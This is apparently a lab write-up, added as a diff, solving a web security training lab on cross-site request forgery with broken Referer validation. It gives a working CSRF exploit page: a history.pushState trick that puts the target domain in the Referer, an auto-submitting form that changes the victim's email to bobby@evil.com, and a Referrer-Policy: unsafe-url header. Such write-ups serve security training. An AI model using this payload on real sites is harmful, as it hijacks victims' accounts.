@@ -1,0 +1,49 @@
+// Lab: CSRF with broken Referer validation
+
+This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.
+
+To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
+
+You can log in to your own account using the following credentials: wiener:peter
+
+
+
+
+// Solution:
+
+1. Log in to the application using the provided credentials (wiener:peter).
+
+Intercept the request and send it into repeater and write Referer:
+Referer: https://0a99005c0365806284b86fcf0004008d.web-security-academy.net/my-account?0a99005c0365806284b86fcf0004008d.web-security-academy.net
+
+
+2. Now Inject this exploit in the exploit server
+
+<script>
+  history.pushState("", "", "/?0a99005c0365806284b86fcf0004008d.web-security-academy.net");
+</script>
+
+<form
+  action="https://0a99005c0365806284b86fcf0004008d.web-security-academy.net/my-account/change-email"
+  method="post"
+>
+  <input type="hidden" name="email" value="bobby@evil.com" />
+  <input type="submit" value="Submit Request" />
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+
+
+and In the Head section above the body Inject:
+
+Referrer-Policy: unsafe-url 
+
+So It looks like:
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Referrer-Policy: unsafe-url
+
+
+
